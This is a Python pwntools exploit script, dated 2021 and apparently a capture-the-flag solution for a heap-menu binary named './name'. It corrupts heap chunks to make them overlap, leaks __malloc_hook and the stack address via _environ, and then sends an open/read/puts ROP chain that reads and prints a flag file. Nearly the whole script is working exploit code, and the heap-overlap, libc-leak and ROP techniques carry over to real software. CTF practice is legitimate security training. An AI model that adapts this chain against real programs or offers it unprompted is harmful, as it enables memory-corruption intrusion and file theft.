# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './name'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-arm', binary,'-g','1234'])
    #p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('5.exit',num)

def add(size):
    cmd(1)
    sla('size:' , size)

def edit(id ,text):
    cmd(2)
    sla('index' , id)
    sa('name' , text)

def show(id):
    cmd(3)
    sla('index' , id)

def delete(id):
    cmd(4)
    sla('index' , id)

# one_gad = one_gadget(libc.path)

add(0x18) #0
add(0x18) #1
add(0x18) #2
add(0xc8) #3

add(0xf8) #4
add(0x38) #5
delete(0)
add(0xf8) #0
add(0x18) #6

delete(4)
edit(5 , flat( '\x00'*0x30 , 0x20 + 0x40 + 0x100 ))
delete(0)


add(0x18) #0
add(0xf8) #4

show(5)
__malloc_hook = l64() - 0x68
lg('__malloc_hook' , __malloc_hook)

libc.address = __malloc_hook - libc.sym['__malloc_hook']
_environ = libc.sym['_environ']

open_addr = libc.sym['open']
read_addr = libc.sym['read']
puts_addr = libc.sym['puts']

pop_rdi_ret = 0x0000000000021102 + libc.address
pop_rsi_ret = 0x00000000000202e8 + libc.address
pop_rdx_ret = 0x0000000000001b92 + libc.address

add(0x18)
show(5)
rl()
puts_addr = u64(p.recv(6).ljust(8 , '\x00'))
lg('puts_addr',puts_addr)

edit(4 , flat(0x20 ,puts_addr, _environ ).rjust(0xf0 , '\x00'))
show(5)
stack = l64() - 0xf0 -0x10
lg('stack',stack)
edit(4 , flat(0x20 ,puts_addr, stack ).rjust(0xf0 , '\x00'))

payload = flat(pop_rdi_ret , 0,pop_rsi_ret , stack +0x38, pop_rdx_ret , 0x100 , read_addr)
edit(5 , payload )

flag_addr = stack + 0x78 + 0x38
payload =  flat( pop_rdi_ret , flag_addr , pop_rsi_ret , 0, open_addr )
payload += flat( pop_rdi_ret ,3 , pop_rsi_ret,flag_addr,pop_rdx_ret,0x100 , read_addr )
payload += flat( pop_rdi_ret , flag_addr , puts_addr ) + 'flag'

se(payload)

# dbg()


p.interactive()

'''
@File    :   name.py
@Time    :   2021/09/14 13:08:28
@Author  :   Niyah 
'''